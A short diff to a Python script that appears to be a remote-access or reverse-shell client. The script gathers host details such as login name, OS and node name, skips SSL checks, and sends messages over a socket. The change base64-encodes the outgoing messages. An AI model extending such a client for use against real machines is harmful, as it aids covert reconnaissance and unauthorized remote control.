@@ -9,7 +9,7 @@ from datetime import datetime
 from sys import exit,exc_info
 from signal import SIGTERM
 from random import randint, uniform, choice
-import argparse
+import argparse,base64
 
 ENCODING_LST = ['utf-8','cp1252']
 #IGNORE SSL CHECKS
@@ -169,13 +169,19 @@ processor: {}
 node: {}""".format(getpid(),getlogin(),date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
     return sys_info
 
+def base64_encode(message):
+    message_bytes = message.encode('ascii')
+    base64_bytes = base64.b64encode(message_bytes)
+    base64_message = base64_bytes.decode('ascii')
+    return base64_message
 
 def send_data(conn, plain_text):
     if type(plain_text) is int:
         plain_text = str(plain_text)
     msg = plain_text + "[END]"
     try:
-        conn.send(msg.encode('utf-8'))
+        base64_msg = base64_encode(msg)
+        conn.send(base64_msg.encode('utf-8'))
     except Exception as e:
         if VERBOSE:
             print(e)
